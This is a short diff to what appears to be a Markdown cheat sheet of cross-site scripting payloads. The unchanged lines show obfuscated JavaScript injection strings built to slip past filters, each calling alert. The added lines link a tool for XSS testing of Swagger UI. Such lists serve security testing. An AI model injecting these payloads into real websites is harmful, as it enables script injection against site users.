@@ -36,3 +36,7 @@ top[/al/.source+/ert/.source](8);
 top[‘al\x65rt’](9);
 foo%27-top[%27al\x65rt%27](document.domain);//
 ```
+> Swagger UI XSS Testing Automation
+```
+https://github.com/Nightmre/swAPI-XSS
+```
